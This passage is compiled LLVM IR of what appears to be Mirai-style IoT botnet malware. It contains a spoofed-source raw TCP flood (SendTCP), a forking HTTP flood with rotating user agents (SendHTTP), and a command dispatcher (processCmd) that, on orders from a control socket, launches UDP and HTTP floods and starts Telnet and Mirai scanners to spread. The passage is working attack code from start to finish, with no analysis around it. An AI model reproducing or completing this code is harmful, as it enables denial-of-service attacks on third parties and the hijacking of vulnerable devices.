  %116 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %115, %112
  %.0.be = phi i32 [ %116, %115 ], [ 0, %112 ]
  br label %.backedge

; <label>:117:                                    ; preds = %112
  call void @llvm.stackrestore(i8* %44)
  br label %118

; <label>:118:                                    ; preds = %22, %17, %27, %117
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) local_unnamed_addr #2 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #15
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %145

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %145, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #7
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %145, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %6, 0
  %34 = sub nsw i32 32, %6
  %35 = shl i32 -1, %34
  %.074 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %4 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.074)
  %46 = call i32 @htonl(i32 %45) #15
  %47 = add i32 %4, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.538, i64 0, i64 0)) #14
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %32
  %64 = and i16 %58, -8177
  %65 = or i16 %64, 8016
  store i16 %65, i16* %57, align 16
  br label %.loopexit

; <label>:66:                                     ; preds = %32
  %67 = call i8* @strtok(i8* %3, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.539, i64 0, i64 0)) #7
  %68 = icmp eq i8* %67, null
  br i1 %68, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %66
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %86
  %.07576 = phi i8* [ %87, %86 ], [ %67, %.lr.ph.preheader ]
  %69 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.540, i64 0, i64 0)) #14
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.sink.split, label %71

; <label>:71:                                     ; preds = %.lr.ph
  %72 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.541, i64 0, i64 0)) #14
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.sink.split, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.542, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %.sink.split, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.543, i64 0, i64 0)) #14
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.sink.split, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @strcmp(i8* nonnull %.07576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.544, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %86

.sink.split:                                      ; preds = %80, %77, %74, %71, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %71 ], [ -257, %74 ], [ -4097, %77 ], [ -2049, %80 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %71 ], [ 256, %74 ], [ 4096, %77 ], [ 2048, %80 ]
  %83 = load i16, i16* %57, align 16
  %84 = and i16 %83, %.sink7
  %85 = or i16 %84, %.sink5
  store i16 %85, i16* %57, align 16
  br label %86

; <label>:86:                                     ; preds = %80, %.sink.split
  %87 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i64 0, i64 0)) #7
  %88 = icmp eq i8* %87, null
  br i1 %88, label %.loopexit.loopexit, label %.lr.ph

.loopexit.loopexit:                               ; preds = %86
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %66, %63
  %89 = call i32 @rand_cmwc()
  %90 = trunc i32 %89 to i16
  %91 = getelementptr inbounds i8, i8* %39, i64 34
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  %93 = getelementptr inbounds i8, i8* %39, i64 36
  %94 = bitcast i8* %93 to i16*
  store i16 0, i16* %94, align 4
  %95 = getelementptr inbounds i8, i8* %39, i64 38
  %96 = bitcast i8* %95 to i16*
  store i16 0, i16* %96, align 2
  br i1 %11, label %97, label %99

; <label>:97:                                     ; preds = %.loopexit
  %98 = call i32 @rand_cmwc()
  br label %103

; <label>:99:                                     ; preds = %.loopexit
  %100 = trunc i32 %1 to i16
  %101 = call zeroext i16 @htons(i16 zeroext %100) #15
  %102 = zext i16 %101 to i32
  br label %103

; <label>:103:                                    ; preds = %99, %97
  %104 = phi i32 [ %98, %97 ], [ %102, %99 ]
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds i8, i8* %39, i64 22
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  %108 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %108, i16* %94, align 4
  %109 = bitcast i8* %39 to i16*
  %110 = getelementptr inbounds i8, i8* %39, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %39, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i64 @time(i64* null) #7
  %118 = zext i32 %2 to i64
  %119 = add i64 %117, %118
  %120 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %121 = getelementptr inbounds i8, i8* %39, i64 12
  %122 = bitcast i8* %121 to i32*
  %123 = getelementptr inbounds i8, i8* %39, i64 4
  %124 = bitcast i8* %123 to i16*
  %sext = shl i64 %119, 32
  %125 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %103
  %.0 = phi i32 [ 0, %103 ], [ %.0.be, %.backedge.backedge ]
  %126 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %120, i32 16) #7
  %127 = call i32 @getRandomIP(i32 %.074)
  %128 = call i32 @htonl(i32 %127) #15
  store i32 %128, i32* %122, align 4
  %129 = call i32 @rand_cmwc()
  %130 = trunc i32 %129 to i16
  store i16 %130, i16* %124, align 4
  %131 = call i32 @rand_cmwc()
  store i32 %131, i32* %53, align 8
  %132 = call i32 @rand_cmwc()
  %133 = trunc i32 %132 to i16
  store i16 %133, i16* %50, align 4
  store i16 0, i16* %94, align 4
  %134 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %134, i16* %94, align 4
  %135 = load i16, i16* %111, align 2
  %136 = zext i16 %135 to i32
  %137 = call zeroext i16 @csum(i16* nonnull %109, i32 %136)
  store i16 %137, i16* %116, align 2
  %138 = icmp eq i32 %.0, %5
  br i1 %138, label %139, label %142

; <label>:139:                                    ; preds = %.backedge
  %140 = call i64 @time(i64* null) #7
  %141 = icmp sgt i64 %140, %125
  br i1 %141, label %144, label %.backedge.backedge

; <label>:142:                                    ; preds = %.backedge
  %143 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %142, %139
  %.0.be = phi i32 [ %143, %142 ], [ 0, %139 ]
  br label %.backedge

; <label>:144:                                    ; preds = %139
  call void @llvm.stackrestore(i8* %38)
  br label %145

; <label>:145:                                    ; preds = %23, %18, %28, %144
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #2 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #7
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #7
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #7
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #2 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #7
  %10 = zext i32 %4 to i64
  %11 = add i64 %9, %10
  %12 = icmp sgt i32 %5, 0
  br i1 %12, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %16

; <label>:14:                                     ; preds = %16
  %15 = icmp slt i32 %25, %5
  br i1 %15, label %16, label %._crit_edge16.loopexit

; <label>:16:                                     ; preds = %.lr.ph15, %14
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %25, %14 ]
  %17 = tail call i32 @rand() #7
  %18 = srem i32 %17, 59
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %19
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %13, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.546, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %21) #7
  %23 = tail call i32 @fork() #7
  %24 = icmp eq i32 %23, 0
  %25 = add nuw nsw i32 %.013, 1
  br i1 %24, label %14, label %.preheader

.preheader:                                       ; preds = %16
  %sext = shl i64 %11, 32
  %26 = ashr exact i64 %sext, 32
  %27 = tail call i64 @time(i64* null) #7
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %13) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %13, i64 %34) #7
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #7
  %37 = tail call i32 @close(i32 %31) #7
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = tail call i64 @time(i64* null) #7
  %39 = icmp sgt i64 %26, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #16
  unreachable

._crit_edge16.loopexit:                           ; preds = %14
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #2 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %321, label %6

; <label>:6:                                      ; preds = %2
  %7 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.548, i64 0, i64 0)) #14
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %9, label %61

; <label>:9:                                      ; preds = %6
  %10 = getelementptr inbounds i8*, i8** %1, i64 1
  %11 = load i8*, i8** %10, align 8
  %12 = tail call i32 @strcmp(i8* %11, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i64 0, i64 0)) #14
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %38

; <label>:14:                                     ; preds = %9
  %15 = tail call i32 @fork() #7
  %16 = tail call i64 @sysconf(i32 84) #7
  %17 = trunc i64 %16 to i32
  %18 = icmp eq i32 %17, 1
  %. = select i1 %18, i32 500, i32 999999
  %19 = icmp sgt i32 %17, 1
  %.. = select i1 %19, i32 1000, i32 %.
  %20 = icmp eq i32 %15, 0
  br i1 %20, label %22, label %21

; <label>:21:                                     ; preds = %14
  store i32 %15, i32* @scanPid, align 4
  br label %321

; <label>:22:                                     ; preds = %14
  %23 = icmp sgt i32 %17, 0
  br i1 %23, label %24, label %38

; <label>:24:                                     ; preds = %22
  %25 = tail call i64 @time(i64* null) #7
  %26 = tail call i32 @getpid() #7
  %27 = zext i32 %26 to i64
  %28 = xor i64 %27, %25
  %29 = tail call i32 @getppid() #7
  %30 = zext i32 %29 to i64
  %31 = add i64 %28, %30
  %32 = trunc i64 %31 to i32
  tail call void @srand(i32 %32) #7
  %33 = tail call i64 @time(i64* null) #7
  %34 = tail call i32 @getpid() #7
  %35 = zext i32 %34 to i64
  %36 = xor i64 %35, %33
  %37 = trunc i64 %36 to i32
  tail call void @init_rand(i32 %37)
  tail call void @TelnetScanner(i32 100, i32 %..)
  unreachable

; <label>:38:                                     ; preds = %9, %22
  %39 = load i8*, i8** %10, align 8
  %40 = tail call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i64 0, i64 0)) #14
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @scanPid, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %321, label %45

; <label>:45:                                     ; preds = %42
  %46 = tail call i32 @kill(i32 %43, i32 9) #7
  store i32 0, i32* @scanPid, align 4
  br label %47

; <label>:47:                                     ; preds = %38, %45
  %48 = load i8*, i8** %10, align 8
  %49 = tail call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i64 0, i64 0)) #14
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %61

; <label>:51:                                     ; preds = %47
  %52 = tail call i32 @atoi(i8* %48) #14
  %53 = getelementptr inbounds i8*, i8** %1, i64 2
  %54 = load i8*, i8** %53, align 8
  %55 = tail call i32 @atoi(i8* %54) #14
  %56 = tail call i32 @listFork()
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %58, label %321

; <label>:58:                                     ; preds = %51
  %59 = load i32, i32* @mainCommSock, align 4
  %60 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %59, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.552, i64 0, i64 0))
  tail call void @TelnetScanner(i32 %55, i32 %52)
  unreachable

; <label>:61:                                     ; preds = %47, %6
  %62 = load i8*, i8** %1, align 8
  %63 = tail call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.553, i64 0, i64 0)) #14
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %117

; <label>:65:                                     ; preds = %61
  %66 = getelementptr inbounds i8*, i8** %1, i64 1
  %67 = load i8*, i8** %66, align 8
  %68 = tail call i32 @strcmp(i8* %67, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i64 0, i64 0)) #14
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %70, label %94

; <label>:70:                                     ; preds = %65
  %71 = tail call i32 @fork() #7
  %72 = tail call i64 @sysconf(i32 84) #7
  %73 = trunc i64 %72 to i32
  %74 = icmp eq i32 %73, 1
  %.1 = select i1 %74, i32 500, i32 999999
  %75 = icmp sgt i32 %73, 1
  %..1 = select i1 %75, i32 1000, i32 %.1
  %76 = icmp eq i32 %71, 0
  br i1 %76, label %78, label %77

; <label>:77:                                     ; preds = %70
  store i32 %71, i32* @scanPid, align 4
  br label %321

; <label>:78:                                     ; preds = %70
  %79 = icmp sgt i32 %73, 0
  br i1 %79, label %80, label %94

; <label>:80:                                     ; preds = %78
  %81 = tail call i64 @time(i64* null) #7
  %82 = tail call i32 @getpid() #7
  %83 = zext i32 %82 to i64
  %84 = xor i64 %83, %81
  %85 = tail call i32 @getppid() #7
  %86 = zext i32 %85 to i64
  %87 = add i64 %84, %86
  %88 = trunc i64 %87 to i32
  tail call void @srand(i32 %88) #7
  %89 = tail call i64 @time(i64* null) #7
  %90 = tail call i32 @getpid() #7
  %91 = zext i32 %90 to i64
  %92 = xor i64 %91, %89
  %93 = trunc i64 %92 to i32
  tail call void @init_rand(i32 %93)
  tail call void @MiraiScanner(i32 100, i32 %..1)
  unreachable

; <label>:94:                                     ; preds = %65, %78
  %95 = load i8*, i8** %66, align 8
  %96 = tail call i32 @strcmp(i8* %95, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i64 0, i64 0)) #14
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %98, label %103

; <label>:98:                                     ; preds = %94
  %99 = load i32, i32* @scanPid, align 4
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %321, label %101

; <label>:101:                                    ; preds = %98
  %102 = tail call i32 @kill(i32 %99, i32 9) #7
  store i32 0, i32* @scanPid, align 4
  br label %103

; <label>:103:                                    ; preds = %94, %101
  %104 = load i8*, i8** %66, align 8
  %105 = tail call i32 @strcmp(i8* %104, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i64 0, i64 0)) #14
  %106 = icmp eq i32 %105, 0
  br i1 %106, label %107, label %117

; <label>:107:                                    ; preds = %103
  %108 = tail call i32 @atoi(i8* %104) #14
  %109 = getelementptr inbounds i8*, i8** %1, i64 2
  %110 = load i8*, i8** %109, align 8
  %111 = tail call i32 @atoi(i8* %110) #14
  %112 = tail call i32 @listFork()
  %113 = icmp eq i32 %112, 0
  br i1 %113, label %114, label %321

; <label>:114:                                    ; preds = %107
  %115 = load i32, i32* @mainCommSock, align 4
  %116 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %115, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.554, i64 0, i64 0))
  tail call void @MiraiScanner(i32 %111, i32 %108)
  unreachable

; <label>:117:                                    ; preds = %103, %61
  %118 = load i8*, i8** %1, align 8
  %119 = tail call i32 @strcmp(i8* %118, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.555, i64 0, i64 0)) #14
  %120 = icmp eq i32 %119, 0
  br i1 %120, label %121, label %151

; <label>:121:                                    ; preds = %117
  %122 = icmp slt i32 %0, 6
  br i1 %122, label %321, label %123

; <label>:123:                                    ; preds = %121
  %124 = getelementptr inbounds i8*, i8** %1, i64 3
  %125 = load i8*, i8** %124, align 8
  %126 = tail call i32 @atoi(i8* %125) #14
  %127 = icmp slt i32 %126, 1
  br i1 %127, label %321, label %128

; <label>:128:                                    ; preds = %123
  %129 = getelementptr inbounds i8*, i8** %1, i64 5
  %130 = load i8*, i8** %129, align 8
  %131 = tail call i32 @atoi(i8* %130) #14
  %132 = icmp slt i32 %131, 1
  br i1 %132, label %321, label %133

; <label>:133:                                    ; preds = %128
  %134 = tail call i32 @listFork()
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %136, label %321

; <label>:136:                                    ; preds = %133
  %137 = getelementptr inbounds i8*, i8** %1, i64 1
  %138 = load i8*, i8** %137, align 8
  %139 = getelementptr inbounds i8*, i8** %1, i64 2
  %140 = load i8*, i8** %139, align 8
  %141 = load i8*, i8** %124, align 8
  %142 = tail call i32 @atoi(i8* %141) #14
  %143 = trunc i32 %142 to i16
  %144 = getelementptr inbounds i8*, i8** %1, i64 4
  %145 = load i8*, i8** %144, align 8
  %146 = load i8*, i8** %129, align 8
  %147 = tail call i32 @atoi(i8* %146) #14
  %148 = getelementptr inbounds i8*, i8** %1, i64 6
  %149 = load i8*, i8** %148, align 8
  %150 = tail call i32 @atoi(i8* %149) #14
  tail call void @SendHTTP(i8* %138, i8* %140, i16 zeroext %143, i8* %145, i32 %147, i32 %150)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:151:                                    ; preds = %117
  %152 = tail call i32 @strcmp(i8* %118, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.556, i64 0, i64 0)) #14
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %154, label %.loopexit142

; <label>:154:                                    ; preds = %151
  %155 = icmp slt i32 %0, 6
  br i1 %155, label %321, label %156

; <label>:156:                                    ; preds = %154
  %157 = getelementptr inbounds i8*, i8** %1, i64 3
  %158 = load i8*, i8** %157, align 8
  %159 = tail call i32 @atoi(i8* %158) #14
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %321, label %161

; <label>:161:                                    ; preds = %156
  %162 = getelementptr inbounds i8*, i8** %1, i64 2
  %163 = load i8*, i8** %162, align 8
  %164 = tail call i32 @atoi(i8* %163) #14
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %321, label %166

; <label>:166:                                    ; preds = %161
  %167 = getelementptr inbounds i8*, i8** %1, i64 4
  %168 = load i8*, i8** %167, align 8
  %169 = tail call i32 @atoi(i8* %168) #14
  %170 = icmp eq i32 %169, -1
  %171 = icmp sgt i32 %169, 1024
  %or.cond = or i1 %170, %171
  br i1 %or.cond, label %321, label %172

; <label>:172:                                    ; preds = %166
  %173 = icmp eq i32 %0, 6
  br i1 %173, label %174, label %179

; <label>:174:                                    ; preds = %172
  %175 = getelementptr inbounds i8*, i8** %1, i64 5
  %176 = load i8*, i8** %175, align 8
  %177 = tail call i32 @atoi(i8* %176) #14
  %178 = icmp slt i32 %177, 1
  br i1 %178, label %321, label %179

; <label>:179:                                    ; preds = %174, %172
  %180 = getelementptr inbounds i8*, i8** %1, i64 1
  %181 = load i8*, i8** %180, align 8
  %182 = load i8*, i8** %162, align 8
  %183 = tail call i32 @atoi(i8* %182) #14
  %184 = load i8*, i8** %157, align 8
  %185 = tail call i32 @atoi(i8* %184) #14
  %186 = load i8*, i8** %167, align 8
  %187 = tail call i32 @atoi(i8* %186) #14
  br i1 %173, label %188, label %192

; <label>:188:                                    ; preds = %179
  %189 = getelementptr inbounds i8*, i8** %1, i64 5
  %190 = load i8*, i8** %189, align 8
  %191 = tail call i32 @atoi(i8* %190) #14
  br label %192

; <label>:192:                                    ; preds = %179, %188
  %193 = phi i32 [ %191, %188 ], [ 10, %179 ]
  %strchr = tail call i8* @strchr(i8* %181, i32 44)
  %194 = icmp eq i8* %strchr, null
  br i1 %194, label %201, label %.preheader141.preheader

.preheader141.preheader:                          ; preds = %192
  br label %.preheader141

.preheader141:                                    ; preds = %.preheader141.preheader, %197
  %.sink = phi i8* [ null, %197 ], [ %181, %.preheader141.preheader ]
  %195 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i64 0, i64 0)) #7
  %196 = icmp eq i8* %195, null
  br i1 %196, label %.loopexit142.loopexit, label %197

; <label>:197:                                    ; preds = %.preheader141
  %198 = tail call i32 @listFork()
  %199 = icmp eq i32 %198, 0
  br i1 %199, label %200, label %.preheader141

; <label>:200:                                    ; preds = %197
  tail call void @SendUDP(i8* nonnull %195, i32 %183, i32 %185, i32 %187, i32 %193, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:201:                                    ; preds = %192
  %202 = tail call i32 @listFork()
  %203 = icmp eq i32 %202, 0
  br i1 %203, label %204, label %321

; <label>:204:                                    ; preds = %201
  tail call void @SendUDP(i8* %181, i32 %183, i32 %185, i32 %187, i32 %193, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit142.loopexit:                            ; preds = %.preheader141
  br label %.loopexit142

.loopexit142:                                     ; preds = %.loopexit142.loopexit, %151
  %205 = load i8*, i8** %1, align 8
  %206 = tail call i32 @strcmp(i8* %205, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.557, i64 0, i64 0)) #14
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %.loopexit140

; <label>:208:                                    ; preds = %.loopexit142
  %209 = icmp slt i32 %0, 6
  br i1 %209, label %321, label %210

; <label>:210:                                    ; preds = %208
  %211 = getelementptr inbounds i8*, i8** %1, i64 3
  %212 = load i8*, i8** %211, align 8
  %213 = tail call i32 @atoi(i8* %212) #14
  %214 = icmp eq i32 %213, -1
  br i1 %214, label %321, label %215

; <label>:215:                                    ; preds = %210
  %216 = getelementptr inbounds i8*, i8** %1, i64 2
  %217 = load i8*, i8** %216, align 8
  %218 = tail call i32 @atoi(i8* %217) #14
  %219 = icmp eq i32 %218, -1
  br i1 %219, label %321, label %220

; <label>:220:                                    ; preds = %215
  %221 = getelementptr inbounds i8*, i8** %1, i64 5
  %222 = load i8*, i8** %221, align 8
  %223 = tail call i32 @atoi(i8* %222) #14
  %224 = icmp slt i32 %223, 0
  br i1 %224, label %321, label %225

; <label>:225:                                    ; preds = %220
